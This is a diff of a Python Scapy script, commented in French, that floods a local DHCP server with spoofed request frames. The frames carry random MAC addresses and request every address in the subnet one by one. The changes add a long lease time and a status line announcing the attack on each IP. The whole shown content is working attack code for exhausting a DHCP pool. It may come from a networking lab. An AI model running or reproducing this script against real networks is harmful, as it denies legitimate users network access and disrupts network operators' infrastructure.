@@ -18,6 +18,7 @@ frame_discover_l2 = IP(src="0.0.0.0", dst="255.255.255.255")
 frame_discover_l3 = UDP(dport=67,sport=68)
 #Ajout de l'en-tête "BOOTP" afin de spécifier des options, "op=1" indique qu'il s'agit d'une demande de démarrage, de plus, l'adresse MAC du client se voit attribuer une adresse aléatoire
 frame_discover_l4 = BOOTP(op=1, chaddr=RandMAC())
+
 #Demande d'adresse IP au serveur DHCP en spécifiant qu'il s'agit d'un message de découverte
 ip = get_if_addr("enxa0cec8f3e4df")
 liste = ip.split(".")
@@ -33,12 +34,13 @@ for j in range(0,256):
     liste.pop(3)
     str_vide = ""
     new = ip_str+str_vide+ "."+str(j)
-    print(new)
-    frame_discover_l5 = DHCP(options=[("message-type","request"),("requested_addr",new),("hostname","hack"),"end"])
+    print("Attaque en cours sur l'ip "+new)
+    frame_release_l4 = BOOTP(ciaddr=new, xid=RandInt())
+    frame_discover_l5 = DHCP(options=[("message-type","request"),("requested_addr",new),("hostname","hack"),("lease_time",100000),"end"])
 #Encapsulation des différentes couches afin d'obtenir un paquet
     frame_discover = frame_discover_l1 / frame_discover_l2 / frame_discover_l3 / frame_discover_l4 / frame_discover_l5
 #Envoie du segment grâce à la fonction "sendp", le DHCP fonctionnant sur la couche L2 du modèle OSI
 #Envoie du paquet à l'intérieur d'une boucle "loop=1" afin d'effectuer plusieurs interrogations demandant les adresses IP
     sendp(frame_discover, iface=interface,loop=0,verbose=0)
     time.sleep(0.4)
-    print(f"Sending packet - "+str(frame_discover_l2.fields["dst"]))
+    #print(f"Sending packet - "+str(frame_discover_l2.fields["dst"]))
